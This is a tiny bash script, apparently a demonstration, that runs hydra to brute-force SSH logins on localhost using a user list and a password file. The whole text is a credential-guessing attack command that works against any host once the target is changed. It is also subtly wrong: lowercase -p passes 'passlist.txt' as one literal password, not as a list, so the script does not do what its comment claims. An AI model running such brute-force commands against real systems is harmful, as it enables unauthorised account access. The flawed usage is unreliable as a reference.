#!/bin/bash
# simulated brute-force attack using hydra on SSH (localhost example)
hydra -L userlist.txt -p passlist.txt ssh://127.0.0.1 -v

